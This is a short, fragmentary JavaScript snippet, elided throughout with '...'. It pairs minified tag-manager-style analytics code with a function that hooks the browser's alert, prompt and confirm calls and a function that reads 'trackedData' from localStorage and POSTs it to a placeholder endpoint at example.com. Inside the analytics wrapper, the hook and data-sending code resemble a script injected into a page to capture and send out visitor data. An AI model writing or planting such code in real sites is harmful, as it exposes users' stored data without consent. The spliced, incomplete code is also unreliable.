...
(function () {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgJrLqwYQ8rmNr4e66v2jARImAFdulMMqSgDlnI3ZBi4k8+RRdPMT1PoQPDY9TEB11euacXZGCSoaAthP";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function hookJSFunctions() {
    const functionsToHook = ["alert", "prompt", "confirm"];
  ...
  function sendTrackedData() {
    const serverUrl = "https://example.com/api/track";
    const data = localStorage.getItem('trackedData');
    fetch(serverUrl, {
      method: "POST",
      headers: {
    ...
    }).then(res => console.log(res.status === 200 ? 'Data sent successfully' : 'Failed to send data')).catch(err => console.error("Error sending data, code: " + err));
  }
